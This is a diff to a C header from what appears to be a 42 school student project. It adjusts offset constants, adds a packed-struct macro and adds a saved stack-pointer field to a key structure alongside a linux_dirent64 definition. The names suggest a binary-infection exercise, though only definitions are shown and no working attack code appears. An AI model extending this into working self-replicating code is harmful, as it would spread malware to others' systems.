@@ -6,7 +6,7 @@
 /*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/03/12 18:26:41 by ddinaut           #+#    #+#             */
-/*   Updated: 2019/04/02 18:05:44 by ddinaut          ###   ########.fr       */
+/*   Updated: 2019/04/03 19:39:31 by ddinaut          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -33,22 +33,23 @@
 # define USER_ENTRY	2
 # define ROOT_ENTRY	4
 # define PROG_ENTRY	3
-# define INST_ENTRY 8
+# define INST_ENTRY 3
 # define KEY_SIZE	16
 
 # define BUFF_SIZE	0x1000
 # define PROG_INFO	512
 
-# define ENTRY_OFF	2262
+# define ENTRY_OFF	2261
 # define KEY_OFF	28
 
 # define __INLINE__	__attribute__((always_inline)) inline
+# define __PACKED__ __attribute__ ((__packed__))
 
 // debug
 # define DEBUG
 
 /* Structures */
-typedef struct __attribute__ ((__packed__)) linux_dirent64
+typedef struct __PACKED__ linux_dirent64
 {
 	__ino64_t			d_ino;
 	__off64_t			d_off;
@@ -68,6 +69,7 @@ typedef struct	s_key
 	size_t		one;
 	size_t		two;
 	size_t		junk[2];
+	void		*rsp;
 }				t_key;
 
 typedef struct	s_bin
